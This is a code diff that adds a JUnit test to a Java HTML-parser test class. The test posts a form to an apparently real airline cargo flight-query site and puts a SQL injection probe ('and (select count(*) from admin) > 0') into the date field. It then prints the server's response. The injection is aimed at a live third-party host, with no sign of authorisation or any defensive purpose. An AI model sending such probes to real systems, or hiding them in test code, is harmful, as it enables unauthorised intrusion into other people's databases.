@@ -129,4 +129,22 @@ public class JSoupParserTest {
         System.out.println(conn.response().cookies());
         System.out.println(doc.html());
     }
+
+    @Test
+    public void testCargo() throws IOException {
+        String url = "http://cargo2.ce-air.com/MU/Service/FlightQuery.aspx?strCul=zh-CN";
+        Map<String, String> data = new HashMap<>();
+        data.put("cmbSelValue", "MU");
+        data.put("fltdate", "1; and (select count(*) from admin) > 0 ");
+        data.put("fltmonth", "11");
+        data.put("fltyear", "2013");
+        data.put("txtCarrier", "MU");
+        data.put("txtFltNo", "5112");
+        data.put("__VIEWSTATE", "/wEPDwULLTE1MjQzNzA0ODNkZOit4tU1CmAFGuZAgTt1xr9NjgaGSVz0MPj34xi/sXz0");
+        data.put("__EVENTVALIDATION", "/wEWAgL7/5rSDQKdqtyUBaDUbNVptoj0/9hv2h7s7q25Y4c8DLtRemL+Y43pb7i0");
+
+        JSoupParser parser = new JSoupParser(url);
+        Document doc = parser.parse(data);
+        System.out.println(doc.html());
+    }
 }
